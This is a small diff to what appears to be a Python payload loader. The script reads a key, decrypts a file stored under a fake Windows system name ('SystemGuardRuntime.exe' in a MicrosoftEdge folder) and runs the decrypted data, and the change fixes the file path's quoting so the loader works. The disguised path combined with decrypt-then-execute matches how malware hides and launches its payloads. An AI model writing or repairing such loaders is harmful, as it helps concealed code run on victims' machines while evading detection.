@@ -39,5 +39,5 @@ def run_decrypted_file(decrypted_data):
 
 if __name__ == "__main__":
     key = load_key("encryption_key.txt")
-    decrypted_data = decrypt_file("\"C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\SystemGuardRuntime.exe\"", key)
+    decrypted_data = decrypt_file("C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\SystemGuardRuntime.exe", key)
     run_decrypted_file(decrypted_data)
